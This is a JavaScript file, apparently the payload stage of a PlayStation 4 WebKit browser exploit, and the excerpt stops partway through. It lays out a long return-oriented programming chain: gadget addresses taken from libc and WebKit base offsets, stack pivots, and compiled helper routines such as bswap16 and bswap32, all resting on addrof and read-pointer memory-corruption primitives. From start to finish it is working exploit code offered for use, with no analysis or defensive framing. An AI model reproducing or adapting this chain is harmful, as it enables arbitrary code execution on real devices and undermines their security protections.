var ropchain_array = new Uint32Array(55018);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
var main_ret = malloc(8);
var printf_buf = malloc(65536);
var __swbuf_addr = 0; // STUB
set_gadgets([
libc_base+788575, //pop rax
ropchain+65720, //rdi_bak
webkit_base+14461559, //mov [rax], rdi
libc_base+206806, //pop rdi
ropchain+65680, //stack_bottom
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
ropchain+112, //ret_addr
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+190640, //_main
//ret_addr:
libc_base+811575, //pop rsp
ropchain+65680 //stack_bottom
]);
//_ps4_printf_buffer:
var printf_buf_offset = 128;
set_gadget(printf_buf);
//_ps4_printf_fd:
db([4294967295, 4294967295]); // -0x1
//stack:
ropchain_offset += 16384;
//stack_bottom:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
main_ret,
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//rdi_bak:
//_pivot_back_addr:
db([0, 0]); // 0x0
set_gadgets([
pivot_addr,
//___builtin_bswap16:
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+65800, //L0
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L0:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+65896, //L3
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+65928, //L5
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L3:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L4:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L5:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+66016, //L6
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+66032, //L7
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L6:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L7:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+66192, //L12
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+66144, //L9
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+66160, //L10
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L9:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L10:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L11:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L12:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+66248, //L13
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L13:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+66352, //L15
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+66384, //L17
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66368, //L16
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L15:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L16:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L17:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+66544, //L21
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+66496, //L18
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66512, //L19
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L18:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L19:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L20:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L21:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+66648, //L23
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66632, //L22
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L22:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L23:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L24:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L25:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+66856, //L28
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+66824, //L26
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L26:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L27:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L28:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+66960, //L30
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+66944, //L29
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L29:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L30:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+67056, //L32
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L31:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L32:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+67144, //L34
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+67160, //L35
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L34:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L35:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+67320, //L40
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+67272, //L37
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+67288, //L38
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L37:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L38:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L39:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L40:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+67376, //L41
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L41:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+67480, //L43
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+67512, //L45
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+67496, //L44
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L43:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L44:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L45:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+67672, //L49
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+67624, //L46
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+67640, //L47
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L46:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L47:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L48:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L49:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+67776, //L51
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+67760, //L50
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L50:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L51:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L52:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L53:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+67976, //L56
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+67944, //L54
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L54:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L55:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L56:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+68080, //L58
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+68064, //L57
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L57:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L58:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+68192, //L61
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+68160, //L59
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L59:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L60:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L61:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+68256, //L62
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+792472 //pop rcx
]);
//L62:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+68312, //L64
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L64:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+68456, //L67
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68472, //L68
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+68440, //L66
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L66:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L67:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L68:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+68592, //L70
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68608, //L71
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+68576, //L69
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L69:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L70:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L71:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+68704, //L72
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68720, //L73
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L72:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L73:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+68832, //L74
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+68816, //L75
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L75:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L74:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+68920, //L77
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+68904, //L76
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L76:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L77:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69016, //L78
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+69032, //L79
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L78:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L79:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69144, //L80
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+69128, //L81
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L81:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L80:
db([0, 0]); // 0x0
//___builtin_bswap32:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69216, //L82
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L82:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+69312, //L85
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+69344, //L87
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L85:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L86:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L87:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+69432, //L88
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+69448, //L89
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L88:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L89:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+69600, //L92
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+69632, //L94
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+69584, //L91
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+69616, //L93
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L91:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L92:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L93:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L94:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+69728, //L96
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+69712, //L95
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L95:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L96:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L97:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L98:
db([24, 0]); // 0x18
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+69928, //L101
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+69896, //L99
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L99:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L100:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L101:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+70032, //L103
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+70016, //L102
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L102:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L103:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+70136, //L105
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L104:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L105:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+70224, //L107
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+70240, //L108
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L107:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L108:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+70392, //L111
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+70424, //L113
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+70376, //L110
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+70408, //L112
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L110:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L111:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L112:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L113:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+70520, //L115
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+70504, //L114
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L114:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L115:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L117:
db([16711680, 0]); // 0xff0000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+70632, //L118
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L118:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+5202439, //and rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L120:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L121:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+70864, //L124
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+70832, //L122
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L122:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L123:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L124:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+70968, //L126
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+70952, //L125
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L125:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+71024, //L128
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L128:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+71080, //L129
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L129:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+71208, //L132
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L131:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L132:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+71296, //L134
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+71312, //L135
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L134:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L135:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+71464, //L138
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+71496, //L140
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+71448, //L137
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+71480, //L139
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L137:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L138:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L139:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L140:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+71592, //L142
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+71576, //L141
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L141:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L142:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L144:
db([65280, 0]); // 0xff00
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+71704, //L145
